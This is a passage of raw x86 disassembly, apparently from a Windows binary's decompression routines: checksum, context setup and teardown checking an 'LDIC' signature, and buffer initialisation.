 10076d1:	8b 45 20             	mov    0x20(%ebp),%eax
 10076d4:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
 10076d8:	53                   	push   %ebx
 10076d9:	56                   	push   %esi
 10076da:	8b 75 08             	mov    0x8(%ebp),%esi
 10076dd:	66 83 a6 ae 00 00 00 	andw   $0x0,0xae(%esi)
 10076e4:	00 
 10076e5:	89 46 38             	mov    %eax,0x38(%esi)
 10076e8:	8b 45 18             	mov    0x18(%ebp),%eax
 10076eb:	57                   	push   %edi
 10076ec:	ff 75 10             	push   0x10(%ebp)
 10076ef:	89 46 24             	mov    %eax,0x24(%esi)
 10076f2:	8b 45 1c             	mov    0x1c(%ebp),%eax
 10076f5:	89 46 28             	mov    %eax,0x28(%esi)
 10076f8:	bb 01 01 00 00       	mov    $0x101,%ebx
 10076fd:	8d 86 b9 05 00 00    	lea    0x5b9(%esi),%eax
 1007703:	53                   	push   %ebx
 1007704:	50                   	push   %eax
 1007705:	8d be bc 07 00 00    	lea    0x7bc(%esi),%edi
 100770b:	e8 11 ef ff ff       	call   0x1006621
 1007710:	68 ff ff 00 00       	push   $0xffff
 1007715:	6a 00                	push   $0x0
 1007717:	ff 75 0c             	push   0xc(%ebp)
 100771a:	56                   	push   %esi
 100771b:	e8 76 f8 ff ff       	call   0x1006f96
 1007720:	85 c0                	test   %eax,%eax
 1007722:	0f 84 54 01 00 00    	je     0x100787c
 1007728:	ff 75 10             	push   0x10(%ebp)
 100772b:	83 a6 9c 00 00 00 00 	andl   $0x0,0x9c(%esi)
 1007732:	53                   	push   %ebx
 1007733:	8d 86 b9 05 00 00    	lea    0x5b9(%esi),%eax
 1007739:	50                   	push   %eax
 100773a:	c7 86 90 00 00 00 ff 	movl   $0xffff,0x90(%esi)
 1007741:	ff 00 00 
 1007744:	e8 d8 ee ff ff       	call   0x1006621
 1007749:	56                   	push   %esi
 100774a:	e8 fa f2 ff ff       	call   0x1006a49
 100774f:	85 c0                	test   %eax,%eax
 1007751:	0f 84 25 01 00 00    	je     0x100787c
 1007757:	33 db                	xor    %ebx,%ebx
 1007759:	e9 03 01 00 00       	jmp    0x1007861
 100775e:	66 ff 8e ac 00 00 00 	decw   0xac(%esi)
 1007765:	56                   	push   %esi
 1007766:	e8 87 f7 ff ff       	call   0x1006ef2
 100776b:	85 c0                	test   %eax,%eax
 100776d:	0f 84 09 01 00 00    	je     0x100787c
 1007773:	8d 86 b4 00 00 00    	lea    0xb4(%esi),%eax
 1007779:	89 47 04             	mov    %eax,0x4(%edi)
 100777c:	8b 46 74             	mov    0x74(%esi),%eax
 100777f:	89 07                	mov    %eax,(%edi)
 1007781:	8d 86 b5 01 00 00    	lea    0x1b5(%esi),%eax
 1007787:	89 47 08             	mov    %eax,0x8(%edi)
 100778a:	8d 86 b6 02 00 00    	lea    0x2b6(%esi),%eax
 1007790:	89 47 0c             	mov    %eax,0xc(%edi)
 1007793:	66 8b 46 7e          	mov    0x7e(%esi),%ax
 1007797:	66 89 47 18          	mov    %ax,0x18(%edi)
 100779b:	66 8b 86 80 00 00 00 	mov    0x80(%esi),%ax
 10077a2:	66 89 47 1a          	mov    %ax,0x1a(%edi)
 10077a6:	66 8b 86 82 00 00 00 	mov    0x82(%esi),%ax
 10077ad:	66 89 47 1c          	mov    %ax,0x1c(%edi)
 10077b1:	8b 46 38             	mov    0x38(%esi),%eax
 10077b4:	89 47 10             	mov    %eax,0x10(%edi)
 10077b7:	66 8b 46 7c          	mov    0x7c(%esi),%ax
 10077bb:	66 89 47 22          	mov    %ax,0x22(%edi)
 10077bf:	66 8b 46 7c          	mov    0x7c(%esi),%ax
 10077c3:	66 25 fd ff          	and    $0xfffd,%ax
 10077c7:	66 3d fd ff          	cmp    $0xfffd,%ax
 10077cb:	75 3b                	jne    0x1007808
 10077cd:	39 9e 9c 00 00 00    	cmp    %ebx,0x9c(%esi)
 10077d3:	57                   	push   %edi
 10077d4:	75 4b                	jne    0x1007821
 10077d6:	6a 01                	push   $0x1
 10077d8:	ff 55 18             	call   *0x18(%ebp)
 10077db:	83 f8 ff             	cmp    $0xffffffff,%eax
 10077de:	59                   	pop    %ecx
 10077df:	59                   	pop    %ecx
 10077e0:	75 68                	jne    0x100784a
 10077e2:	53                   	push   %ebx
 10077e3:	6a 0b                	push   $0xb
 10077e5:	ff 36                	push   (%esi)
 10077e7:	e8 c8 00 00 00       	call   0x10078b4
 10077ec:	e9 8b 00 00 00       	jmp    0x100787c
 10077f1:	66 8b 46 7c          	mov    0x7c(%esi),%ax
 10077f5:	66 25 fe ff          	and    $0xfffe,%ax
 10077f9:	66 3d fe ff          	cmp    $0xfffe,%ax
 10077fd:	75 4b                	jne    0x100784a
 10077ff:	66 ff 86 ae 00 00 00 	incw   0xae(%esi)
 1007806:	eb 42                	jmp    0x100784a
 1007808:	39 9e 9c 00 00 00    	cmp    %ebx,0x9c(%esi)
 100780e:	75 33                	jne    0x1007843
 1007810:	66 8b 47 22          	mov    0x22(%edi),%ax
 1007814:	66 3b 46 6a          	cmp    0x6a(%esi),%ax
 1007818:	72 06                	jb     0x1007820
 100781a:	66 3d fc ff          	cmp    $0xfffc,%ax
 100781e:	72 2a                	jb     0x100784a
 1007820:	57                   	push   %edi
 1007821:	6a 02                	push   $0x2
 1007823:	ff 55 18             	call   *0x18(%ebp)
 1007826:	83 f8 ff             	cmp    $0xffffffff,%eax
 1007829:	59                   	pop    %ecx
 100782a:	59                   	pop    %ecx
 100782b:	89 86 8c 00 00 00    	mov    %eax,0x8c(%esi)
 1007831:	74 af                	je     0x10077e2
 1007833:	3b c3                	cmp    %ebx,%eax
 1007835:	74 ba                	je     0x10077f1
 1007837:	56                   	push   %esi
 1007838:	e8 38 fd ff ff       	call   0x1007575
 100783d:	85 c0                	test   %eax,%eax
 100783f:	74 3b                	je     0x100787c
 1007841:	eb 07                	jmp    0x100784a
 1007843:	66 89 9e ac 00 00 00 	mov    %bx,0xac(%esi)
 100784a:	66 39 9e ac 00 00 00 	cmp    %bx,0xac(%esi)
 1007851:	0f 85 07 ff ff ff    	jne    0x100775e
 1007857:	56                   	push   %esi
 1007858:	e8 ec f1 ff ff       	call   0x1006a49
 100785d:	85 c0                	test   %eax,%eax
 100785f:	74 1b                	je     0x100787c
 1007861:	66 39 9e ac 00 00 00 	cmp    %bx,0xac(%esi)
 1007868:	0f 85 f0 fe ff ff    	jne    0x100775e
 100786e:	66 ff 8e ac 00 00 00 	decw   0xac(%esi)
 1007875:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
 100787c:	8b 86 88 00 00 00    	mov    0x88(%esi),%eax
 1007882:	83 cb ff             	or     $0xffffffff,%ebx
 1007885:	3b c3                	cmp    %ebx,%eax
 1007887:	74 05                	je     0x100788e
 1007889:	50                   	push   %eax
 100788a:	ff 56 18             	call   *0x18(%esi)
 100788d:	59                   	pop    %ecx
 100788e:	8d be 84 00 00 00    	lea    0x84(%esi),%edi
 1007894:	8b 07                	mov    (%edi),%eax
 1007896:	3b c3                	cmp    %ebx,%eax
 1007898:	74 05                	je     0x100789f
 100789a:	50                   	push   %eax
 100789b:	ff 56 18             	call   *0x18(%esi)
 100789e:	59                   	pop    %ecx
 100789f:	8b 45 fc             	mov    -0x4(%ebp),%eax
 10078a2:	89 1f                	mov    %ebx,(%edi)
 10078a4:	5f                   	pop    %edi
 10078a5:	89 9e 88 00 00 00    	mov    %ebx,0x88(%esi)
 10078ab:	5e                   	pop    %esi
 10078ac:	5b                   	pop    %ebx
 10078ad:	c9                   	leave
 10078ae:	c3                   	ret
 10078af:	cc                   	int3
 10078b0:	cc                   	int3
 10078b1:	cc                   	int3
 10078b2:	cc                   	int3
 10078b3:	cc                   	int3
 10078b4:	8b ff                	mov    %edi,%edi
 10078b6:	55                   	push   %ebp
 10078b7:	8b ec                	mov    %esp,%ebp
 10078b9:	8b 45 08             	mov    0x8(%ebp),%eax
 10078bc:	8b 4d 0c             	mov    0xc(%ebp),%ecx
 10078bf:	89 08                	mov    %ecx,(%eax)
 10078c1:	8b 4d 10             	mov    0x10(%ebp),%ecx
 10078c4:	89 48 04             	mov    %ecx,0x4(%eax)
 10078c7:	c7 40 08 01 00 00 00 	movl   $0x1,0x8(%eax)
 10078ce:	5d                   	pop    %ebp
 10078cf:	c2 0c 00             	ret    $0xc
 10078d2:	cc                   	int3
 10078d3:	cc                   	int3
 10078d4:	cc                   	int3
 10078d5:	cc                   	int3
 10078d6:	cc                   	int3
 10078d7:	8b ff                	mov    %edi,%edi
 10078d9:	55                   	push   %ebp
 10078da:	8b ec                	mov    %esp,%ebp
 10078dc:	8b 4d 08             	mov    0x8(%ebp),%ecx
 10078df:	56                   	push   %esi
 10078e0:	8b 75 0c             	mov    0xc(%ebp),%esi
 10078e3:	8b c6                	mov    %esi,%eax
 10078e5:	c1 e8 02             	shr    $0x2,%eax
 10078e8:	85 c0                	test   %eax,%eax
 10078ea:	57                   	push   %edi
 10078eb:	8b 7d 10             	mov    0x10(%ebp),%edi
 10078ee:	7e 24                	jle    0x1007914
 10078f0:	53                   	push   %ebx
 10078f1:	0f b6 11             	movzbl (%ecx),%edx
 10078f4:	33 db                	xor    %ebx,%ebx
 10078f6:	41                   	inc    %ecx
 10078f7:	8a 39                	mov    (%ecx),%bh
 10078f9:	0b d3                	or     %ebx,%edx
 10078fb:	41                   	inc    %ecx
 10078fc:	0f b6 19             	movzbl (%ecx),%ebx
 10078ff:	c1 e3 10             	shl    $0x10,%ebx
 1007902:	0b d3                	or     %ebx,%edx
 1007904:	41                   	inc    %ecx
 1007905:	0f b6 19             	movzbl (%ecx),%ebx
 1007908:	c1 e3 18             	shl    $0x18,%ebx
 100790b:	0b d3                	or     %ebx,%edx
 100790d:	41                   	inc    %ecx
 100790e:	33 fa                	xor    %edx,%edi
 1007910:	48                   	dec    %eax
 1007911:	75 de                	jne    0x10078f1
 1007913:	5b                   	pop    %ebx
 1007914:	83 e6 03             	and    $0x3,%esi
 1007917:	33 c0                	xor    %eax,%eax
 1007919:	4e                   	dec    %esi
 100791a:	74 14                	je     0x1007930
 100791c:	4e                   	dec    %esi
 100791d:	74 0a                	je     0x1007929
 100791f:	4e                   	dec    %esi
 1007920:	75 13                	jne    0x1007935
 1007922:	0f b6 01             	movzbl (%ecx),%eax
 1007925:	c1 e0 10             	shl    $0x10,%eax
 1007928:	41                   	inc    %ecx
 1007929:	33 d2                	xor    %edx,%edx
 100792b:	8a 31                	mov    (%ecx),%dh
 100792d:	0b c2                	or     %edx,%eax
 100792f:	41                   	inc    %ecx
 1007930:	0f b6 09             	movzbl (%ecx),%ecx
 1007933:	0b c1                	or     %ecx,%eax
 1007935:	33 c7                	xor    %edi,%eax
 1007937:	5f                   	pop    %edi
 1007938:	5e                   	pop    %esi
 1007939:	5d                   	pop    %ebp
 100793a:	c2 0c 00             	ret    $0xc
 100793d:	cc                   	int3
 100793e:	cc                   	int3
 100793f:	cc                   	int3
 1007940:	cc                   	int3
 1007941:	cc                   	int3
 1007942:	8b ff                	mov    %edi,%edi
 1007944:	55                   	push   %ebp
 1007945:	8b ec                	mov    %esp,%ebp
 1007947:	8b 45 08             	mov    0x8(%ebp),%eax
 100794a:	8b 00                	mov    (%eax),%eax
 100794c:	8b 4d 18             	mov    0x18(%ebp),%ecx
 100794f:	05 00 18 00 00       	add    $0x1800,%eax
 1007954:	89 01                	mov    %eax,(%ecx)
 1007956:	8b 45 1c             	mov    0x1c(%ebp),%eax
 1007959:	85 c0                	test   %eax,%eax
 100795b:	75 02                	jne    0x100795f
 100795d:	5d                   	pop    %ebp
 100795e:	c3                   	ret
 100795f:	83 20 00             	andl   $0x0,(%eax)
 1007962:	56                   	push   %esi
 1007963:	57                   	push   %edi
 1007964:	8b 7d 10             	mov    0x10(%ebp),%edi
 1007967:	6a 2c                	push   $0x2c
 1007969:	ff d7                	call   *%edi
 100796b:	8b f0                	mov    %eax,%esi
 100796d:	85 f6                	test   %esi,%esi
 100796f:	59                   	pop    %ecx
 1007970:	74 17                	je     0x1007989
 1007972:	68 fc 2e 00 00       	push   $0x2efc
 1007977:	ff d7                	call   *%edi
 1007979:	85 c0                	test   %eax,%eax
 100797b:	59                   	pop    %ecx
 100797c:	89 45 18             	mov    %eax,0x18(%ebp)
 100797f:	89 46 28             	mov    %eax,0x28(%esi)
 1007982:	75 0a                	jne    0x100798e
 1007984:	56                   	push   %esi
 1007985:	ff 55 14             	call   *0x14(%ebp)
 1007988:	59                   	pop    %ecx
 1007989:	33 c0                	xor    %eax,%eax
 100798b:	40                   	inc    %eax
 100798c:	eb 6d                	jmp    0x10079fb
 100798e:	8b 45 24             	mov    0x24(%ebp),%eax
 1007991:	8b 55 20             	mov    0x20(%ebp),%edx
 1007994:	8b 4d 0c             	mov    0xc(%ebp),%ecx
 1007997:	53                   	push   %ebx
 1007998:	ff 75 30             	push   0x30(%ebp)
 100799b:	8b 5d 14             	mov    0x14(%ebp),%ebx
 100799e:	ff 75 2c             	push   0x2c(%ebp)
 10079a1:	89 46 10             	mov    %eax,0x10(%esi)
 10079a4:	8b 45 28             	mov    0x28(%ebp),%eax
 10079a7:	ff 75 28             	push   0x28(%ebp)
 10079aa:	89 46 14             	mov    %eax,0x14(%esi)
 10079ad:	8b 45 2c             	mov    0x2c(%ebp),%eax
 10079b0:	ff 75 24             	push   0x24(%ebp)
 10079b3:	89 46 18             	mov    %eax,0x18(%esi)
 10079b6:	8b 45 30             	mov    0x30(%ebp),%eax
 10079b9:	89 46 1c             	mov    %eax,0x1c(%esi)
 10079bc:	8b 45 08             	mov    0x8(%ebp),%eax
 10079bf:	89 7e 04             	mov    %edi,0x4(%esi)
 10079c2:	89 5e 08             	mov    %ebx,0x8(%esi)
 10079c5:	89 56 0c             	mov    %edx,0xc(%esi)
 10079c8:	8b 00                	mov    (%eax),%eax
 10079ca:	52                   	push   %edx
 10079cb:	53                   	push   %ebx
 10079cc:	89 46 20             	mov    %eax,0x20(%esi)
 10079cf:	8b 41 04             	mov    0x4(%ecx),%eax
 10079d2:	57                   	push   %edi
 10079d3:	89 46 24             	mov    %eax,0x24(%esi)
 10079d6:	c7 06 4c 44 49 43    	movl   $0x4349444c,(%esi)
 10079dc:	ff 31                	push   (%ecx)
 10079de:	ff 75 18             	push   0x18(%ebp)
 10079e1:	e8 6f 01 00 00       	call   0x1007b55
 10079e6:	85 c0                	test   %eax,%eax
 10079e8:	75 09                	jne    0x10079f3
 10079ea:	56                   	push   %esi
 10079eb:	ff d3                	call   *%ebx
 10079ed:	33 c0                	xor    %eax,%eax
 10079ef:	59                   	pop    %ecx
 10079f0:	40                   	inc    %eax
 10079f1:	eb 07                	jmp    0x10079fa
 10079f3:	8b 45 1c             	mov    0x1c(%ebp),%eax
 10079f6:	89 30                	mov    %esi,(%eax)
 10079f8:	33 c0                	xor    %eax,%eax
 10079fa:	5b                   	pop    %ebx
 10079fb:	5f                   	pop    %edi
 10079fc:	5e                   	pop    %esi
 10079fd:	5d                   	pop    %ebp
 10079fe:	c3                   	ret
 10079ff:	cc                   	int3
 1007a00:	cc                   	int3
 1007a01:	cc                   	int3
 1007a02:	cc                   	int3
 1007a03:	cc                   	int3
 1007a04:	8b ff                	mov    %edi,%edi
 1007a06:	55                   	push   %ebp
 1007a07:	8b ec                	mov    %esp,%ebp
 1007a09:	51                   	push   %ecx
 1007a0a:	8b 4d 08             	mov    0x8(%ebp),%ecx
 1007a0d:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
 1007a11:	81 39 4c 44 49 43    	cmpl   $0x4349444c,(%ecx)
 1007a17:	74 05                	je     0x1007a1e
 1007a19:	6a 02                	push   $0x2
 1007a1b:	58                   	pop    %eax
 1007a1c:	c9                   	leave
 1007a1d:	c3                   	ret
 1007a1e:	56                   	push   %esi
 1007a1f:	8b 75 18             	mov    0x18(%ebp),%esi
 1007a22:	8b 06                	mov    (%esi),%eax
 1007a24:	3b 41 20             	cmp    0x20(%ecx),%eax
 1007a27:	76 05                	jbe    0x1007a2e
 1007a29:	6a 03                	push   $0x3
 1007a2b:	58                   	pop    %eax
 1007a2c:	eb 23                	jmp    0x1007a51
 1007a2e:	8d 55 fc             	lea    -0x4(%ebp),%edx
 1007a31:	52                   	push   %edx
 1007a32:	50                   	push   %eax
 1007a33:	ff 75 14             	push   0x14(%ebp)
 1007a36:	ff 75 10             	push   0x10(%ebp)
 1007a39:	ff 75 0c             	push   0xc(%ebp)
 1007a3c:	50                   	push   %eax
 1007a3d:	ff 71 28             	push   0x28(%ecx)
 1007a40:	e8 ad 00 00 00       	call   0x1007af2
 1007a45:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 1007a48:	f7 d8                	neg    %eax
 1007a4a:	1b c0                	sbb    %eax,%eax
 1007a4c:	89 0e                	mov    %ecx,(%esi)
 1007a4e:	83 e0 04             	and    $0x4,%eax
 1007a51:	5e                   	pop    %esi
 1007a52:	c9                   	leave
 1007a53:	c3                   	ret
 1007a54:	cc                   	int3
 1007a55:	cc                   	int3
 1007a56:	cc                   	int3
 1007a57:	cc                   	int3
 1007a58:	cc                   	int3
 1007a59:	8b ff                	mov    %edi,%edi
 1007a5b:	55                   	push   %ebp
 1007a5c:	8b ec                	mov    %esp,%ebp
 1007a5e:	8b 45 08             	mov    0x8(%ebp),%eax
 1007a61:	81 38 4c 44 49 43    	cmpl   $0x4349444c,(%eax)
 1007a67:	74 05                	je     0x1007a6e
 1007a69:	6a 02                	push   $0x2
 1007a6b:	58                   	pop    %eax
 1007a6c:	5d                   	pop    %ebp
 1007a6d:	c3                   	ret
 1007a6e:	ff 70 28             	push   0x28(%eax)
 1007a71:	e8 50 00 00 00       	call   0x1007ac6
 1007a76:	33 c0                	xor    %eax,%eax
 1007a78:	5d                   	pop    %ebp
 1007a79:	c3                   	ret
 1007a7a:	cc                   	int3
 1007a7b:	cc                   	int3
 1007a7c:	cc                   	int3
 1007a7d:	cc                   	int3
 1007a7e:	cc                   	int3
 1007a7f:	8b ff                	mov    %edi,%edi
 1007a81:	55                   	push   %ebp
 1007a82:	8b ec                	mov    %esp,%ebp
 1007a84:	56                   	push   %esi
 1007a85:	8b 75 08             	mov    0x8(%ebp),%esi
 1007a88:	81 3e 4c 44 49 43    	cmpl   $0x4349444c,(%esi)
 1007a8e:	74 05                	je     0x1007a95
 1007a90:	6a 02                	push   $0x2
 1007a92:	58                   	pop    %eax
 1007a93:	eb 19                	jmp    0x1007aae
 1007a95:	ff 76 28             	push   0x28(%esi)
 1007a98:	e8 19 00 00 00       	call   0x1007ab6
 1007a9d:	ff 76 28             	push   0x28(%esi)
 1007aa0:	83 26 00             	andl   $0x0,(%esi)
 1007aa3:	ff 56 08             	call   *0x8(%esi)
 1007aa6:	56                   	push   %esi
 1007aa7:	ff 56 08             	call   *0x8(%esi)
 1007aaa:	59                   	pop    %ecx
 1007aab:	59                   	pop    %ecx
 1007aac:	33 c0                	xor    %eax,%eax
 1007aae:	5e                   	pop    %esi
 1007aaf:	5d                   	pop    %ebp
 1007ab0:	c3                   	ret
 1007ab1:	cc                   	int3
 1007ab2:	cc                   	int3
 1007ab3:	cc                   	int3
 1007ab4:	cc                   	int3
 1007ab5:	cc                   	int3
 1007ab6:	8b ff                	mov    %edi,%edi
 1007ab8:	55                   	push   %ebp
 1007ab9:	8b ec                	mov    %esp,%ebp
 1007abb:	5d                   	pop    %ebp
 1007abc:	e9 6c 01 00 00       	jmp    0x1007c2d
 1007ac1:	cc                   	int3
 1007ac2:	cc                   	int3
 1007ac3:	cc                   	int3
 1007ac4:	cc                   	int3
 1007ac5:	cc                   	int3
 1007ac6:	8b ff                	mov    %edi,%edi
 1007ac8:	55                   	push   %ebp
 1007ac9:	8b ec                	mov    %esp,%ebp
 1007acb:	56                   	push   %esi
 1007acc:	8b 75 08             	mov    0x8(%ebp),%esi
 1007acf:	56                   	push   %esi
 1007ad0:	e8 7c 01 00 00       	call   0x1007c51
 1007ad5:	56                   	push   %esi
 1007ad6:	e8 06 02 00 00       	call   0x1007ce1
 1007adb:	56                   	push   %esi
 1007adc:	e8 4f 02 00 00       	call   0x1007d30
 1007ae1:	83 a6 cc 2e 00 00 00 	andl   $0x0,0x2ecc(%esi)
 1007ae8:	5e                   	pop    %esi
 1007ae9:	5d                   	pop    %ebp
 1007aea:	c2 04 00             	ret    $0x4
 1007aed:	cc                   	int3
 1007aee:	cc                   	int3
 1007aef:	cc                   	int3
 1007af0:	cc                   	int3
 1007af1:	cc                   	int3
 1007af2:	8b ff                	mov    %edi,%edi
 1007af4:	55                   	push   %ebp
 1007af5:	8b ec                	mov    %esp,%ebp
 1007af7:	8b 45 10             	mov    0x10(%ebp),%eax
 1007afa:	8b 4d 14             	mov    0x14(%ebp),%ecx
 1007afd:	56                   	push   %esi
 1007afe:	8b 75 08             	mov    0x8(%ebp),%esi
 1007b01:	89 86 04 2b 00 00    	mov    %eax,0x2b04(%esi)
 1007b07:	8d 44 08 04          	lea    0x4(%eax,%ecx,1),%eax
 1007b0b:	89 86 08 2b 00 00    	mov    %eax,0x2b08(%esi)
 1007b11:	8b 45 18             	mov    0x18(%ebp),%eax
 1007b14:	56                   	push   %esi
 1007b15:	89 86 0c 2b 00 00    	mov    %eax,0x2b0c(%esi)
 1007b1b:	e8 73 05 00 00       	call   0x1008093
 1007b20:	ff 75 0c             	push   0xc(%ebp)
 1007b23:	56                   	push   %esi
 1007b24:	e8 e4 02 00 00       	call   0x1007e0d
 1007b29:	ff 86 cc 2e 00 00    	incl   0x2ecc(%esi)
 1007b2f:	85 c0                	test   %eax,%eax
 1007b31:	7d 0b                	jge    0x1007b3e
 1007b33:	8b 45 20             	mov    0x20(%ebp),%eax
 1007b36:	83 20 00             	andl   $0x0,(%eax)
 1007b39:	33 c0                	xor    %eax,%eax
 1007b3b:	40                   	inc    %eax
 1007b3c:	eb 0d                	jmp    0x1007b4b
 1007b3e:	8b 4d 20             	mov    0x20(%ebp),%ecx
 1007b41:	89 01                	mov    %eax,(%ecx)
 1007b43:	01 86 10 2b 00 00    	add    %eax,0x2b10(%esi)
 1007b49:	33 c0                	xor    %eax,%eax
 1007b4b:	5e                   	pop    %esi
 1007b4c:	5d                   	pop    %ebp
 1007b4d:	c2 1c 00             	ret    $0x1c
 1007b50:	cc                   	int3
 1007b51:	cc                   	int3
 1007b52:	cc                   	int3
 1007b53:	cc                   	int3
 1007b54:	cc                   	int3
 1007b55:	8b ff                	mov    %edi,%edi
 1007b57:	55                   	push   %ebp
 1007b58:	8b ec                	mov    %esp,%ebp
 1007b5a:	8b 45 10             	mov    0x10(%ebp),%eax
 1007b5d:	56                   	push   %esi
 1007b5e:	8b 75 08             	mov    0x8(%ebp),%esi
 1007b61:	89 86 e0 2e 00 00    	mov    %eax,0x2ee0(%esi)
 1007b67:	8b 45 14             	mov    0x14(%ebp),%eax
 1007b6a:	89 86 e4 2e 00 00    	mov    %eax,0x2ee4(%esi)
 1007b70:	8b 45 18             	mov    0x18(%ebp),%eax
 1007b73:	89 86 e8 2e 00 00    	mov    %eax,0x2ee8(%esi)
 1007b79:	8b 45 1c             	mov    0x1c(%ebp),%eax
 1007b7c:	89 86 ec 2e 00 00    	mov    %eax,0x2eec(%esi)
 1007b82:	8b 45 20             	mov    0x20(%ebp),%eax
 1007b85:	89 86 f0 2e 00 00    	mov    %eax,0x2ef0(%esi)
 1007b8b:	8b 45 24             	mov    0x24(%ebp),%eax
 1007b8e:	89 86 f4 2e 00 00    	mov    %eax,0x2ef4(%esi)
 1007b94:	8b 45 28             	mov    0x28(%ebp),%eax
 1007b97:	89 86 f8 2e 00 00    	mov    %eax,0x2ef8(%esi)
 1007b9d:	8b 45 0c             	mov    0xc(%ebp),%eax
 1007ba0:	8d 48 ff             	lea    -0x1(%eax),%ecx
 1007ba3:	85 c8                	test   %ecx,%eax
 1007ba5:	89 46 04             	mov    %eax,0x4(%esi)
 1007ba8:	89 4e 08             	mov    %ecx,0x8(%esi)
 1007bab:	75 0a                	jne    0x1007bb7
 1007bad:	56                   	push   %esi
 1007bae:	e8 1b 00 00 00       	call   0x1007bce
 1007bb3:	85 c0                	test   %eax,%eax
 1007bb5:	75 04                	jne    0x1007bbb
 1007bb7:	33 c0                	xor    %eax,%eax
 1007bb9:	eb 09                	jmp    0x1007bc4
 1007bbb:	56                   	push   %esi
 1007bbc:	e8 05 ff ff ff       	call   0x1007ac6
 1007bc1:	33 c0                	xor    %eax,%eax
 1007bc3:	40                   	inc    %eax
 1007bc4:	5e                   	pop    %esi
 1007bc5:	5d                   	pop    %ebp
 1007bc6:	c2 24 00             	ret    $0x24
 1007bc9:	cc                   	int3
 1007bca:	cc                   	int3
 1007bcb:	cc                   	int3
 1007bcc:	cc                   	int3
 1007bcd:	cc                   	int3
 1007bce:	8b ff                	mov    %edi,%edi
 1007bd0:	55                   	push   %ebp
 1007bd1:	8b ec                	mov    %esp,%ebp
 1007bd3:	53                   	push   %ebx
 1007bd4:	56                   	push   %esi
 1007bd5:	8b 75 08             	mov    0x8(%ebp),%esi
 1007bd8:	8b 56 04             	mov    0x4(%esi),%edx
 1007bdb:	57                   	push   %edi
 1007bdc:	6a 04                	push   $0x4
 1007bde:	c6 86 b5 2e 00 00 04 	movb   $0x4,0x2eb5(%esi)
 1007be5:	5f                   	pop    %edi
 1007be6:	8a 86 b5 2e 00 00    	mov    0x2eb5(%esi),%al
 1007bec:	0f b6 c8             	movzbl %al,%ecx
 1007bef:	8a 89 f0 25 00 01    	mov    0x10025f0(%ecx),%cl
 1007bf5:	33 db                	xor    %ebx,%ebx
 1007bf7:	43                   	inc    %ebx
 1007bf8:	d3 e3                	shl    %cl,%ebx
 1007bfa:	03 fb                	add    %ebx,%edi
 1007bfc:	fe c0                	inc    %al
 1007bfe:	3b fa                	cmp    %edx,%edi
 1007c00:	88 86 b5 2e 00 00    	mov    %al,0x2eb5(%esi)
 1007c06:	72 de                	jb     0x1007be6
 1007c08:	81 c2 05 01 00 00    	add    $0x105,%edx
 1007c0e:	52                   	push   %edx
 1007c0f:	ff 96 e0 2e 00 00    	call   *0x2ee0(%esi)
 1007c15:	59                   	pop    %ecx
 1007c16:	33 c9                	xor    %ecx,%ecx
 1007c18:	85 c0                	test   %eax,%eax
 1007c1a:	0f 95 c1             	setne  %cl
 1007c1d:	5f                   	pop    %edi
 1007c1e:	89 06                	mov    %eax,(%esi)
 1007c20:	5e                   	pop    %esi
 1007c21:	5b                   	pop    %ebx
 1007c22:	8b c1                	mov    %ecx,%eax
 1007c24:	5d                   	pop    %ebp
 1007c25:	c2 04 00             	ret    $0x4
 1007c28:	cc                   	int3
 1007c29:	cc                   	int3
 1007c2a:	cc                   	int3
 1007c2b:	cc                   	int3
 1007c2c:	cc                   	int3
 1007c2d:	8b ff                	mov    %edi,%edi
 1007c2f:	55                   	push   %ebp
 1007c30:	8b ec                	mov    %esp,%ebp
 1007c32:	56                   	push   %esi
 1007c33:	8b 75 08             	mov    0x8(%ebp),%esi
 1007c36:	8b 06                	mov    (%esi),%eax
 1007c38:	85 c0                	test   %eax,%eax
 1007c3a:	74 0b                	je     0x1007c47
 1007c3c:	50                   	push   %eax
 1007c3d:	ff 96 e4 2e 00 00    	call   *0x2ee4(%esi)
 1007c43:	83 26 00             	andl   $0x0,(%esi)
 1007c46:	59                   	pop    %ecx
 1007c47:	5e                   	pop    %esi
 1007c48:	5d                   	pop    %ebp
 1007c49:	c2 04 00             	ret    $0x4
 1007c4c:	cc                   	int3
 1007c4d:	cc                   	int3
 1007c4e:	cc                   	int3
 1007c4f:	cc                   	int3
 1007c50:	cc                   	int3
 1007c51:	8b ff                	mov    %edi,%edi
 1007c53:	55                   	push   %ebp
 1007c54:	8b ec                	mov    %esp,%ebp
 1007c56:	8b 55 08             	mov    0x8(%ebp),%edx
 1007c59:	0f b6 82 b5 2e 00 00 	movzbl 0x2eb5(%edx),%eax
 1007c60:	56                   	push   %esi
 1007c61:	8d 04 c5 00 01 00 00 	lea    0x100(,%eax,8),%eax
 1007c68:	be a0 02 00 00       	mov    $0x2a0,%esi
 1007c6d:	3b c6                	cmp    %esi,%eax
 1007c6f:	57                   	push   %edi
 1007c70:	7c 02                	jl     0x1007c74
 1007c72:	8b c6                	mov    %esi,%eax
 1007c74:	8b c8                	mov    %eax,%ecx
 1007c76:	53                   	push   %ebx
 1007c77:	8b d9                	mov    %ecx,%ebx
 1007c79:	c1 e9 02             	shr    $0x2,%ecx
 1007c7c:	33 c0                	xor    %eax,%eax
 1007c7e:	8d ba 18 0a 00 00    	lea    0xa18(%edx),%edi
 1007c84:	f3 ab                	rep stos %eax,%es:(%edi)
 1007c86:	8b cb                	mov    %ebx,%ecx
 1007c88:	83 e1 03             	and    $0x3,%ecx
 1007c8b:	f3 aa                	rep stos %al,%es:(%edi)
 1007c8d:	0f b6 82 b5 2e 00 00 	movzbl 0x2eb5(%edx),%eax
 1007c94:	8d 04 c5 00 01 00 00 	lea    0x100(,%eax,8),%eax
 1007c9b:	3b c6                	cmp    %esi,%eax
 1007c9d:	5b                   	pop    %ebx
 1007c9e:	7c 02                	jl     0x1007ca2
 1007ca0:	8b c6                	mov    %esi,%eax
 1007ca2:	8b c8                	mov    %eax,%ecx
 1007ca4:	8b f1                	mov    %ecx,%esi
 1007ca6:	c1 e9 02             	shr    $0x2,%ecx
 1007ca9:	33 c0                	xor    %eax,%eax
 1007cab:	8d ba 14 2b 00 00    	lea    0x2b14(%edx),%edi
 1007cb1:	f3 ab                	rep stos %eax,%es:(%edi)
 1007cb3:	8b ce                	mov    %esi,%ecx
 1007cb5:	83 e1 03             	and    $0x3,%ecx
 1007cb8:	f3 aa                	rep stos %al,%es:(%edi)
 1007cba:	6a 3e                	push   $0x3e
